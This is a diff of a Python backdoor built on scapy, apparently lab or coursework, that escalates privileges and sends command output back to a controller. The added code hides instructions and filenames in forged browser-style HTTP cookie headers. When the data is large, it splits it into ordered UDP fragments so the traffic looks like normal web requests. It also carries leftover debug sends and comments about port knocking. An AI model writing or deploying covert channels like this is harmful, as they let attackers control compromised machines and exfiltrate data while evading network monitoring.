@@ -181,25 +181,6 @@ def start_backdoor():
     """
     print("Starting Receiver.")
 
-    message = "hello"
-    request = f"POST / HTTP/1.1\r\n" \
-              f"Host: 192.168.1.195\r\n" \
-              f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
-              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
-              f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
-              f"Accept-Encoding: gzip, deflate\r\n" \
-              f"Cookie:\r\n" \
-              f"session={message + message}\r\n" \
-              f"Connection: keep-alive\r\n" \
-              f"Upgrade-Insecure-Requests: 1\r\n" \
-              f"Content-Type: text/html; charset=utf-8\r\n" \
-              f"Content-Length: {len(message)}\r\n\r\n" + message
-
-    http_request = IP(dst="192.168.1.185") / TCP(sport=6000, dport=80, flags='PA', seq=1,
-                                         ack=1) / request
-    send(http_request, verbose=0)
-
-    exit()
 
     # Elevate privileges.
     setuid(0)
@@ -401,7 +382,7 @@ def send_command_output(data, address, port):
         my_sock.sendall(data.encode("utf-8"))
 
 
-def send_message(message, instruction, filename):
+def send_message(message, instruction, filename=""):
 
     address = config.sender_address
     # sport = 7000
@@ -420,8 +401,70 @@ def send_message(message, instruction, filename):
     ack = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='A', seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1)
     send(ack, verbose=0)
 
-    message = "hello"
-    request = f"POST / HTTP/1.1\r\n\r\n" + message
+    # message = "hello"
+    # request = f"POST / HTTP/1.1\r\n\r\n" + message
+    request = f"POST / HTTP/1.1\r\n" \
+              f"Host: 192.168.1.195\r\n" \
+              f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
+              f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
+              f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
+              f"Accept-Encoding: gzip, deflate\r\n" \
+              f"Cookie:\r\n" \
+              f"session_type={instruction},session_name={filename},session=0000000001\r\n" \
+              f"Connection: keep-alive\r\n" \
+              f"Upgrade-Insecure-Requests: 1\r\n" \
+              f"Content-Type: text/html; charset=utf-8\r\n" \
+              f"Content-Length: {len(message)}\r\n\r\n" + message
+
+    print(f"len_request: {len(request)}")
+
+    if len(request) <= 1400:
+        http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
+                                             ack=syn_ack[TCP].seq + 1) / request
+        send(http_request, verbose=0)
+    else:
+        num_parts = str(len(textwrap.wrap(request, 1400))).zfill(10)
+        new_request = f"POST / HTTP/1.1\r\n" \
+                  f"Host: {config.sender_address}\r\n" \
+                  f"User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0\r\n" \
+                  f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n" \
+                  f"Accept-Language: en-CA,en-US;q=0.7,en;q=0.3\r\n" \
+                  f"Accept-Encoding: gzip, deflate\r\n" \
+                  f"Cookie:\r\n" \
+                  f"session_type={instruction},session_name={filename},session={num_parts}\r\n" \
+                  f"Connection: keep-alive\r\n" \
+                  f"Upgrade-Insecure-Requests: 1\r\n" \
+                  f"Content-Type: text/html; charset=utf-8\r\n" \
+                  f"Content-Length: {len(message)}\r\n\r\n" + message
+
+        parts = textwrap.wrap(new_request, 1400)
+        for idx, part in enumerate(parts):
+            payload = part
+            if idx > 0:
+                packet_order = f"{config.delimiter}{idx + 1}".encode('utf-8')
+                payload += packet_order
+
+            http_post = IP(dst=address) / UDP(sport=syn_ack[TCP].dport, dport=dport) / Raw(load=payload)
+            send(http_post, verbose=0)
+            # message = one_time_password + packet_order + delimiter + command
+            # encrypt_msg = packet_start + encryption.encrypt(message.encode('utf-8')).decode('utf-8')
+            # encrypt_len = len(encrypt_msg.encode('utf-8'))
+            # if encrypt_len > 508:
+            #     print("Warning, payload in port knock packet exceeding 508 bytes, may not decrypt if payload "
+            #           "is truncated.")
+            #     port_knock2 = IP(dst=receiver_addr) / UDP(sport=sport, dport=port) / Raw(load=encrypt_msg)
+            #     send(port_knock2, verbose=0)
+        print("Warning, payload in port knock packet exceeding 500 bytes, may not decrypt if payload truncated.")
+
+
+
+
+
+
+
+    http_request = IP(dst="192.168.1.182") / TCP(sport=6000, dport=80, flags='PA', seq=1,
+                                                 ack=1) / request
+    send(http_request, verbose=0)
 
     http_request = IP(dst=address) / TCP(sport=syn_ack[TCP].dport, dport=dport, flags='PA', seq=syn_ack[TCP].ack,
                                          ack=syn_ack[TCP].seq + 1) / request
